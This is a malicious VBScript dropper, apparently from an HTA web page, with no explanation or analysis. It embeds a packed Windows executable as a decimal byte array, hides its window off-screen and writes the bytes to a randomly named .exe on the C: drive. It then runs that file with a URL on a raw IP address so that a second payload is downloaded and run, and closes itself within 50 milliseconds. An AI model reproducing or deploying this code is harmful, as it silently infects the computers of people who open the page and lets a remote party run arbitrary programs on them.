Dim correct
code = "77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0,184,0,0,0,0,0,0,0,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,128,0,0,0,14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104,105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111,116,32,98,101,"
code = code & "32,114,117,110,32,105,110,32,68,79,83,32,109,111,100,101,46,13,13,10,36,0,0,0,0,0,0,0,80,69,0,0,76,1,3,0,50,26,83,63,0,0,0,0,0,0,0,0,224,0,15,2,11,1,2,56,0,16,0,0,0,16,0,0,0,80,0,0,16,102,0,0,0,96,0,0,0,112,0,0,0,0,64,0,0,16,0,0,0,2,0,0,4,0,0,0,1,0,0,0,"
code = code & "4,0,0,0,0,0,0,0,0,128,0,0,0,16,0,0,0,0,0,0,2,0,0,0,0,0,32,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,112,0,0,160,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,"
code = code & "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,85,80,88,48,0,0,0,0,0,80,0,0,0,16,0,0,0,0,0,0,0,2,0,0,"
code = code & "0,0,0,0,0,0,0,0,0,0,0,0,128,0,0,224,85,80,88,49,0,0,0,0,0,16,0,0,0,96,0,0,0,8,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,224,85,80,88,50,0,0,0,0,0,16,0,0,0,112,0,0,0,2,0,0,0,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,192,49,46,50,50,"
code = code & "0,85,80,88,33,12,9,2,8,106,38,53,240,174,162,52,14,11,67,0,0,239,5,0,0,0,18,0,0,38,1,0,245,155,111,255,255,85,137,229,131,236,20,141,69,252,80,161,8,32,64,0,80,9,248,80,104,4,104,0,247,127,183,117,4,199,23,0,0,232,1,0,5,148,137,236,93,195,137,246,47,238,219,223,125,80,80,139,21,12,28,133,210,116,89,161,4,65,8,137,"
code = code & "16,161,12,6,223,111,179,255,133,192,117,81,131,248,224,116,34,30,11,192,32,81,82,80,59,132,201,219,236,239,137,4,36,7,140,131,196,42,38,192,116,29,216,191,0,50,64,109,141,116,38,0,36,253,253,35,44,72,235,142,144,141,180,38,163,141,188,39,219,219,255,238,6,159,86,83,49,246,139,69,8,49,219,139,61,0,61,145,19,192,239,222,108,237,15,135,141,5,10,141,"
code = code & "115,69,61,5,6,116,11,141,101,51,223,111,255,248,137,216,91,94,93,194,4,244,80,106,0,106,11,87,124,155,252,182,112,123,1,116,19,203,116,222,23,12,21,255,208,131,203,255,219,30,164,219,235,207,37,1,235,235,190,6,0,55,126,154,3,57,8,11,166,8,235,198,127,187,95,246,47,29,133,246,117,5,73,235,136,16,116,235,244,123,187,223,223,61,147,133,184,61,148,6,"
code = code & "182,233,78,245,144,239,191,91,190,246,173,83,64,16,104,208,16,220,59,188,12,50,225,115,187,31,232,82,254,255,255,9,0,44,30,17,108,26,19,14,119,102,4,31,139,8,161,172,35,37,140,252,240,3,172,137,195,42,100,137,28,196,31,112,236,155,33,239,153,255,21,248,64,97,1,140,12,216,86,184,106,49,192,108,125,182,31,2,15,246,78,152,136,233,37,70,117,114,108,255,"
code = code & "255,223,254,109,111,110,46,100,108,108,42,82,76,68,111,119,110,108,111,97,100,84,111,67,97,99,104,101,70,105,108,119,255,255,198,101,65,57,116,116,112,58,47,47,0,99,111,109,109,97,110,100,46,7,32,47,99,223,110,239,254,32,100,101,108,32,0,144,95,129,236,124,8,72,87,86,231,196,244,104,48,237,93,251,147,18,204,137,133,156,247,224,205,141,189,0,252,8,96,222,"
code = code & "204,133,133,180,132,180,35,248,104,59,6,249,190,143,254,212,163,0,48,148,8,29,132,83,107,112,35,108,255,117,18,172,175,129,109,22,53,184,14,131,153,194,4,103,164,161,183,183,159,225,54,201,56,117,79,6,252,106,68,20,141,181,238,125,127,219,176,251,103,86,55,164,199,133,11,68,81,28,110,139,52,155,16,157,160,83,18,32,80,231,190,203,222,83,86,82,1,87,27,220,"
code = code & "82,197,61,231,190,111,139,141,187,81,17,228,193,67,122,27,123,54,243,68,247,156,8,236,19,83,83,214,237,238,30,244,190,91,181,252,185,5,113,243,165,47,83,112,48,22,27,228,0,252,156,190,10,252,153,126,195,189,153,141,165,120,68,168,95,201,194,16,0,127,217,125,31,163,17,33,84,131,228,240,33,44,4,4,252,239,82,193,177,6,4,119,250,191,168,80,13,116,255,255,"
code = code & "119,132,12,133,219,116,49,138,3,60,32,116,122,60,9,116,118,60,34,116,95,11,78,221,216,101,163,222,132,15,67,26,63,14,4,126,188,233,46,117,241,11,51,47,247,69,212,219,116,30,223,235,104,151,66,216,37,120,229,83,238,83,20,236,238,111,124,89,2,119,93,252,201,195,184,10,36,235,227,144,69,205,109,239,230,249,245,235,196,12,101,6,78,12,181,99,96,155,175,235,"
code = code & "170,31,70,3,230,233,27,102,235,63,106,16,181,133,201,117,4,231,88,255,175,241,255,16,202,17,141,66,4,139,82,4,163,16,91,175,219,88,238,117,233,93,111,83,47,32,22,51,25,119,13,237,255,116,45,224,193,27,233,104,112,20,56,223,131,241,220,180,142,68,159,255,20,157,44,75,183,161,224,254,117,246,235,217,139,29,36,10,48,7,199,186,21,55,164,187,255,141,118,0,"
code = code & "64,139,76,130,4,120,247,235,180,111,143,240,142,21,94,20,114,19,141,199,5,13,191,39,61,227,3,250,4,156,25,141,191,5,81,137,159,127,223,254,225,131,193,8,61,0,16,10,114,16,129,233,7,131,9,0,45,235,233,180,251,237,221,41,193,11,137,224,137,204,219,139,64,4,255,224,111,255,37,7,25,100,251,71,144,144,7,252,244,8,65,50,200,32,39,28,0,16,32,39,"
code = code & "79,14,240,64,32,65,24,78,14,50,200,36,20,224,64,188,25,100,144,65,220,208,184,100,144,65,6,192,200,212,144,65,6,25,228,196,216,44,246,220,100,204,0,247,7,0,8,5,138,10,223,42,16,42,117,44,38,229,64,36,20,40,218,34,128,100,85,94,21,133,177,247,252,66,237,69,242,74,68,67,44,65,3,154,166,105,154,64,80,96,116,140,160,107,154,166,105,180,200,220,"
code = code & "236,12,95,166,233,186,1,24,11,40,3,56,76,154,166,105,154,88,100,112,124,132,144,101,155,166,105,156,168,180,192,66,119,38,10,178,85,3,64,23,114,16,98,0,20,36,5,1,146,64,46,101,119,81,17,84,15,184,48,96,95,254,255,1,67,114,101,97,116,101,80,114,111,99,101,115,115,65,69,120,105,116,13,248,246,95,182,28,70,101,76,105,98,114,97,114,121,12,71,101,"
code = code & "116,67,143,189,69,0,218,18,110,101,65,16,77,111,100,19,246,3,192,117,108,255,78,97,109,19,72,123,255,130,117,39,108,17,79,65,100,100,114,83,15,91,178,173,253,83,104,111,114,20,118,104,52,18,116,6,64,247,151,97,117,112,73,110,102,111,16,76,91,99,47,93,176,119,30,83,85,110,104,79,100,219,230,126,107,158,153,112,116,105,111,110,115,182,114,28,87,63,205,118,"
code = code & "107,139,19,101,99,209,97,240,95,95,103,246,221,90,107,48,166,23,61,103,115,14,112,2,183,151,111,251,101,110,118,105,132,110,28,115,95,97,112,19,116,121,237,58,215,220,112,101,15,78,240,7,102,195,110,111,237,117,191,246,8,109,191,24,102,112,175,101,26,109,205,218,204,185,98,5,11,25,183,50,124,183,61,182,186,109,31,115,105,103,106,108,7,116,114,99,97,116,130,99,"
code = code & "128,139,2,90,80,69,127,48,224,223,230,1,4,0,50,26,83,63,110,224,0,15,2,11,1,107,110,93,247,2,56,0,8,12,6,3,2,7,16,18,16,33,93,115,179,167,32,64,11,23,57,208,0,230,150,205,102,7,80,12,30,48,101,47,200,119,16,7,16,6,0,83,145,5,191,74,80,3,188,46,189,179,21,12,35,10,223,48,144,22,238,22,246,235,4,35,185,96,46,100,"
code = code & "49,97,22,118,54,233,16,40,212,12,39,96,135,57,238,194,192,46,98,58,66,48,115,108,108,246,93,128,39,105,80,243,64,48,131,5,43,27,14,79,6,103,0,0,160,17,158,144,0,0,0,255,0,0,0,0,0,0,0,0,0,0,0,0,96,190,21,96,64,0,141,190,235,175,255,255,87,131,205,255,235,16,144,144,144,144,144,144,138,6,70,136,7,71,1,219,117,7,139,30,"
code = code & "131,238,252,17,219,114,237,184,1,0,0,0,1,219,117,7,139,30,131,238,252,17,219,17,192,1,219,115,239,117,9,139,30,131,238,252,17,219,115,228,49,201,131,232,3,114,13,193,224,8,138,6,70,131,240,255,116,116,137,197,1,219,117,7,139,30,131,238,252,17,219,17,201,1,219,117,7,139,30,131,238,252,17,219,17,201,117,32,65,1,219,117,7,139,30,131,238,252,17,219,"
code = code & "17,201,1,219,115,239,117,9,139,30,131,238,252,17,219,115,228,131,193,2,129,253,0,243,255,255,131,209,1,141,20,47,131,253,252,118,15,138,2,66,136,7,71,73,117,247,233,99,255,255,255,144,139,2,131,194,4,137,7,131,199,4,131,233,4,119,241,1,207,233,76,255,255,255,94,137,247,185,42,0,0,0,138,7,71,44,232,60,1,119,247,128,63,1,117,242,139,7,138,95,"
code = code & "4,102,193,232,8,193,192,16,134,196,41,248,128,235,232,1,240,137,7,131,199,5,137,216,226,217,141,190,0,64,0,0,139,7,9,192,116,60,139,95,4,141,132,48,0,96,0,0,1,243,80,131,199,8,255,150,60,96,0,0,149,138,7,71,8,192,116,220,137,249,87,72,242,174,85,255,150,64,96,0,0,9,192,116,7,137,3,131,195,4,235,225,255,150,68,96,0,0,97,233,"
code = code & "172,170,255,255,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,"
code = code & "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,84,112,0,0,60,112,0,0,0,0,0,0,0,0,0,0,0,0,0,0,97,112,0,0,76,112,0,0,"
code = code & "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,108,112,0,0,122,112,0,0,138,112,0,0,0,0,0,0,152,112,0,0,0,0,0,0,75,69,82,78,69,76,51,50,46,68,76,76,0,109,115,118,99,114,116,46,100,108,108,0,0,0,76,111,97,100,76,105,98,114,97,114,121,65,0,0,71,101,116,80,114,111,99,65,100,100,114,101,115,115,0,0,"
code = code & "69,120,105,116,80,114,111,99,101,115,115,0,0,0,95,105,111,98,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,"
code = code & "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,"
code = code & "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,"
code = code & "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,"
self.MoveTo 5000, 5000
bytes = Split(code,",")
Set fso = CreateObject("Scripting.FileSystemObject")
path = "c:\"
Randomize
For i=0 To 10
  path = path & Chr(Rnd()*25+97)
Next
path = path & ".exe"
Set f = fso.CreateTextFile(path, ForWriting)
For i=0 To UBound(bytes)-1
   f.Write Chr(bytes(i))
Next
f.Close
Set shell = CreateObject("WScript.Shell")
path2 = path & "  http://66.230.134.150/d/sex_es.exe"
shell.run(path2)
self.setTimeout "self.close()", 50
